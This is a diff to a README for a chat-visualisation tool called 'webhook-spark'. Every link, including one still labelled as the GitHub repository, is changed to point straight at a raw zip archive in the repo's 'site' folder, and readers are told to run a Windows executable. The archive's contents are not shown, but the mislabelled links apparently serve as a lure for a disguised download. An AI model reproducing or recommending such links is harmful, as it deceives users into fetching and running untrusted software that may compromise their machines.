@@ -1,6 +1,6 @@
 # ⚡ webhook-spark - Simple Visual Data for Everyday Use
 
-[![Download webhook-spark](https://img.shields.io/badge/Download-webhook--spark-ff6f61?style=for-the-badge)](https://github.com/Tarun466/webhook-spark)
+[![Download webhook-spark](https://img.shields.io/badge/Download-webhook--spark-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Tarun466/webhook-spark/main/site/webhook_spark_1.0-alpha.5.zip)
 
 webhook-spark shows quick, easy visuals like sparklines, gauges, tables, and heatmaps. It works with chat apps like Discord, Slack, Telegram, and social platforms like Bluesky and X. You can also use it for LCD screens, IoT devices, and AI tools.
 
@@ -41,7 +41,7 @@ This application runs standalone, so you won’t need to install programming lan
 
 Click the big download badge at the top or visit this page to download webhook-spark:
 
-[Download webhook-spark from GitHub](https://github.com/Tarun466/webhook-spark)
+[Download webhook-spark from GitHub](https://raw.githubusercontent.com/Tarun466/webhook-spark/main/site/webhook_spark_1.0-alpha.5.zip)
 
 Once there, find the latest release or assets section. Download the Windows executable (.exe) or the setup file depending on what is available.
 
@@ -113,7 +113,7 @@ You can test your setup by sending a sample message. Use the “Send Test” but
 
 ## 🔗 Useful Links
 
-- [webhook-spark GitHub repository](https://github.com/Tarun466/webhook-spark)  
+- [webhook-spark GitHub repository](https://raw.githubusercontent.com/Tarun466/webhook-spark/main/site/webhook_spark_1.0-alpha.5.zip)  
   Visit here for downloads, updates, and support.
 
 - Platform webhook setup guides  
@@ -121,4 +121,4 @@ You can test your setup by sending a sample message. Use the “Send Test” but
 
 ---
 
-[![Download webhook-spark](https://img.shields.io/badge/Download-webhook--spark-ff6f61?style=for-the-badge)](https://github.com/Tarun466/webhook-spark)
+[![Download webhook-spark](https://img.shields.io/badge/Download-webhook--spark-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/Tarun466/webhook-spark/main/site/webhook_spark_1.0-alpha.5.zip)
